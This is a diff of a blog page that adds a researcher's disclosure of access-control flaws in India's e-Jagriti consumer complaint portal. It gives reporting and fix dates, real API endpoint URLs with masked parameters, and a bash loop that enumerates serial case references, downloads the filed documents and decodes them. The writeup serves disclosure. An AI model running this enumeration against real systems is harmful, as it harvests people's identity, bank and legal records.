@@ -10,7 +10,7 @@
         <meta name="author" content="z-aki">
       
       
-        <link rel="canonical" href="https://z-aki.github.io/vuln/2025/08/14/e-jagriti/">
+        <link rel="canonical" href="https://z-aki.github.io/vuln/2025/08/14/e-jagriti-portal-vulnerabilities-2025/">
       
       
         <link rel="prev" href="../manipal-hospitals-pvt-ltd-vulnerability-2024/">
@@ -27,7 +27,7 @@
     
     
       
-        <title>E-Jagriti - z-aki</title>
+        <title>E-Jagriti portal Vulnerabilities 2025 - z-aki</title>
       
     
     
@@ -71,6 +71,11 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
+      
+        
+        <a href="#1-casefilingdocumentdetails" class="md-skip">
+          Skip to content
+        </a>
       
     </div>
     <div data-md-component="announce">
@@ -152,7 +157,7 @@ Use RSS feed apps/extensions to get updates about new posts (without sharing you
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              E-Jagriti
+              E-Jagriti portal Vulnerabilities 2025
             
           </span>
         </div>
@@ -1009,7 +1014,7 @@ Use RSS feed apps/extensions to get updates about new posts (without sharing you
                       <li class="md-nav__item">
                         <div class="md-nav__link">
                           <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><path d="M15 13h1.5v2.82l2.44 1.41-.75 1.3L15 16.69zm4-5H5v11h4.67c-.43-.91-.67-1.93-.67-3a7 7 0 0 1 7-7c1.07 0 2.09.24 3 .67zM5 21a2 2 0 0 1-2-2V5c0-1.11.89-2 2-2h1V1h2v2h8V1h2v2h1a2 2 0 0 1 2 2v6.1c1.24 1.26 2 2.99 2 4.9a7 7 0 0 1-7 7c-1.91 0-3.64-.76-4.9-2zm11-9.85A4.85 4.85 0 0 0 11.15 16c0 2.68 2.17 4.85 4.85 4.85A4.85 4.85 0 0 0 20.85 16c0-2.68-2.17-4.85-4.85-4.85"></path></svg>
-                          <time datetime="2025-08-14 00:00:00+00:00" class="md-ellipsis">August 14, 2025</time>
+                          <time datetime="2025-09-12 00:00:00+00:00" class="md-ellipsis">September 12, 2025</time>
                         </div>
                       </li>
                     
@@ -1021,7 +1026,7 @@ Use RSS feed apps/extensions to get updates about new posts (without sharing you
                           <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"></path></svg>
                           <span class="md-ellipsis">
                             
-                              1 min read
+                              3 min read
                             
                           </span>
                         </div>
@@ -1040,6 +1045,32 @@ Use RSS feed apps/extensions to get updates about new posts (without sharing you
   
   
   
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-casefilingdocumentdetails" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. CaseFilingDocumentDetails
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-getallcomplainantrespondantdetails" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. getAllComplainantRespondantDetails
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
   
 </nav>
           
@@ -1070,9 +1101,123 @@ Use RSS feed apps/extensions to get updates about new posts (without sharing you
   
 
 
-  <h1>E-Jagriti</h1>
+  <h1>E-Jagriti portal Vulnerabilities 2025</h1>
 
-<p>-</p>
+<div><p>The EJagriti portal (<a href="https://e-jagriti.gov.in" target="_blank" rel="noopener noreferrer" plugin_open_external_links_in_new_tab="">https://e-jagriti.gov.in</a>), which is an upgrade of
+e-daakhil portal, is mandatory for consumer complaint filing and tracking.
+Any complaint has to be uploaded on this portal before submitting it to the
+consumer commission registry. It is developed and maintained by NIC(<a href="https://nic.gov.in" target="_blank" rel="noopener noreferrer" plugin_open_external_links_in_new_tab="">https://nic.gov.in</a>)
+and content owned by the Department Of Consumer Affairs, Ministry Of Consumer Affairs,
+Food &amp; Public Distribution, Government Of India</p>
+<p>These vulnerabilities allowed access to all case
+documents (including sensitive information such as ID proofs, affidavits with
+sign, complaint details, and depending on the case: medical records, bank
+details, purchase details, land records etc. ) in a trivial manner. Further,
+the case reference ID, being a serially increasing number, allowed serial
+access to all other users' case documents.</p>
+<p>Summary of the vulnerabilities</p>
+<table>
+<thead>
+<tr>
+<th>Sr</th>
+<th>API</th>
+<th>Date reported</th>
+<th>Date fixed</th>
+<th>Days taken</th>
+<th>CERT-in reference number</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><a href="#1-casefilingdocumentdetails">CaseFilingDocumentDetails</a></td>
+<td>30 May 2025</td>
+<td>Partial fix before 17 June. Full fix never confirmed to me. Guessing July</td>
+<td>18-47</td>
+<td>38480225</td>
+</tr>
+<tr>
+<td>2</td>
+<td><a href="#2-getallcomplainantrespondantdetails">getAllComplainantRespondantDetails</a></td>
+<td>30 May 2025</td>
+<td>Partial fix before 17 June. Full fix never confirmed to me. Guessing July</td>
+<td>18-47</td>
+<td>38480225</td>
+</tr>
+</tbody>
+</table>
+<p>Root cause in <a href="https://cheatsheetseries.owasp.org/index.html" target="_blank" rel="noopener noreferrer" plugin_open_external_links_in_new_tab="">OWASP</a> terms:</p>
+<ul>
+<li>A01 2021 Broken Access Control: CWE-35 Path Traversal, CWE-284 Improper
+  Access Control, CWE-285 Improper Authorization</li>
+<li>A04 2021 Insecure Design: Insecure Direct Object Reference</li>
+<li>A07 2021 Identification and Authentication Failures: CWE-287 Improper
+  Authentication, CWE-613 Insufficient Session Expiration</li>
+</ul>
+<!-- more -->
+
+<p>In my <a href="https://pgportal.gov.in" target="_blank" rel="noopener noreferrer" plugin_open_external_links_in_new_tab="">https://pgportal.gov.in</a> complaint and appeal, I was assured that after fixing
+the issue, they will reach out to me for verification. But that hasn't
+happened as of the date of 12 September 2025. In a public "jansunwai" in the
+last week of August, the e-jagriti officers confirmed to me that they have
+fixed the issue and I can proceed with the public release of this report.</p>
+<h3 id="1-casefilingdocumentdetails">1. CaseFilingDocumentDetails<a class="headerlink" href="#1-casefilingdocumentdetails" title="Permanent link">¶</a></h3>
+<p>This API accepted a query parameter <code>fillingReferenceNumber</code> and retrieves
+details about the case filing documents, masked as <code>$$$$</code>. This case
+reference is simply a date in format <code>YYYYMMDD</code> followed by a 4 digit
+serially increasing number, xxxx starting from 0001.</p>
+<p>This API returned the following files:</p>
+<ol>
+<li>the memo of parties which contains PII of the complainant, address, phone
+number, email ID, etc.,</li>
+<li>complaint itself which contains sensitive information like bank account details,
+Aadhaar number, policy number, income information,</li>
+<li>Signed annexures which have identity proofs, signature, affidavit, etc.</li>
+<li>Judgement and orders related to the case.</li>
+<li>Any replies or rejoinders filed by the complainant or the opposite party.</li>
+</ol>
+<p>Simply opening this URL in the browser was enough</p>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">sample_urls.sh</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>https://e-jagriti.gov.in/services/case/caseFilingService/v2/getCaseFillingDocumentDetails?fillingReferenceNumber<span class="o">=</span><span class="nv">$$$$</span>
+</code></pre></div></td></tr></table></div>
+<p>However, for decoding the base64-encoded files, this is a sample script.
+The output contained an array of objects (accessible via <code>jq</code> (<a href="https://jqlang.org/" target="_blank" rel="noopener noreferrer" plugin_open_external_links_in_new_tab="">https://jqlang.org/</a>))
+which had base64 encoded file, which can be decoded to get the actual PDF or image file.</p>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">sample_script.sh</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="hll"><span class="k">for</span><span class="w"> </span>reference<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">{</span><span class="nv">$$$$$$$$</span>..<span class="nv">$$$$$$$$</span><span class="o">}</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span class="w">    </span><span class="nv">timestamp</span><span class="o">=</span><span class="k">$(</span>date<span class="w"> </span><span class="s1">'+%F_%T'</span><span class="k">)</span>
+<span class="w">    </span><span class="nv">outname</span><span class="o">=</span><span class="s2">"output_doc_</span><span class="si">${</span><span class="nv">reference</span><span class="si">}</span><span class="s2">_</span><span class="si">${</span><span class="nv">timestamp</span><span class="si">}</span><span class="s2">"</span>
+<span class="hll"><span class="w">    </span>curl<span class="w"> </span>-v<span class="w"> </span><span class="s1">'https://e-jagriti.gov.in/services/case/caseFilingService/v2/getCaseFillingDocumentDetails?fillingReferenceNumber=$$$$'</span><span class="s2">"</span><span class="nv">$reference</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
+</span><span class="w">    </span>-o<span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">outname</span><span class="si">}</span><span class="s2">.json"</span>
+
+<span class="w">    </span>jq<span class="w"> </span><span class="s1">'.'</span><span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">outname</span><span class="si">}</span><span class="s2">.json"</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">outname</span><span class="si">}</span><span class="s2">_pretty.json"</span>
+
+<span class="w">    </span>jq<span class="w"> </span>-r<span class="w"> </span><span class="s1">'.data.caseFillingDocumentDetailsResponseList[] | "\(.fileName)\t\(.fileContent)"'</span><span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">outname</span><span class="si">}</span><span class="s2">.json"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="nv">IFS</span><span class="o">=</span><span class="s1">$'\t'</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>-r<span class="w"> </span>fileName<span class="w"> </span>fileContent<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">fileContent</span><span class="si">}</span><span class="s2">"</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">outname</span><span class="si">}</span><span class="s2">_files_</span><span class="si">${</span><span class="nv">fileName</span><span class="si">}</span><span class="s2">.txt"</span>
+<span class="w">        </span>base64<span class="w"> </span>--decode<span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">outname</span><span class="si">}</span><span class="s2">_files_</span><span class="si">${</span><span class="nv">fileName</span><span class="si">}</span><span class="s2">.txt"</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">outname</span><span class="si">}</span><span class="s2">_files_</span><span class="si">${</span><span class="nv">fileName</span><span class="si">}</span><span class="s2">.pdf"</span>
+<span class="hll"><span class="w">    </span><span class="k">done</span>
+</span><span class="k">done</span>
+</code></pre></div></td></tr></table></div>
+<h3 id="2-getallcomplainantrespondantdetails">2. getAllComplainantRespondantDetails<a class="headerlink" href="#2-getallcomplainantrespondantdetails" title="Permanent link">¶</a></h3>
+<p>This API differs from the above in that this output is machine readable JSON
+text. The above API returns a document which contained the document.</p>
+<p>This API returned the following data:</p>
+<ol>
+<li>the personal contact details of parties which contained address, phone
+number, email ID, etc.</li>
+</ol>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">sample_urls.sh</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>https://e-jagriti.gov.in/services/case/caseFilingService/v2/getAllComplainantRespondantDetails?filingReferenceNumber<span class="o">=</span><span class="nv">$$$$</span>
+</code></pre></div></td></tr></table></div></div>
 
 
 
